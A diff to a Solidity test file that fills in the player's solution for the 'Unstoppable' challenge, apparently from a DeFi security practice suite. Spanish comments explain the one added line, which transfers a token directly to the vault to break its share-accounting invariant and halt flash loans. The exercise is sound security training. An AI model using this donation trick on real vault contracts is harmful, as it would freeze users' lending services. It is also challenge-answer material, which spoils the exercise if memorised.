@@ -91,7 +91,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Enviar tokens directamente al vault (bypass deposit)
+       // Esto desbalancea totalAssets vs convertToShares(totalSupply)
+    token.transfer(address(vault), 1);
     }
 
     /**
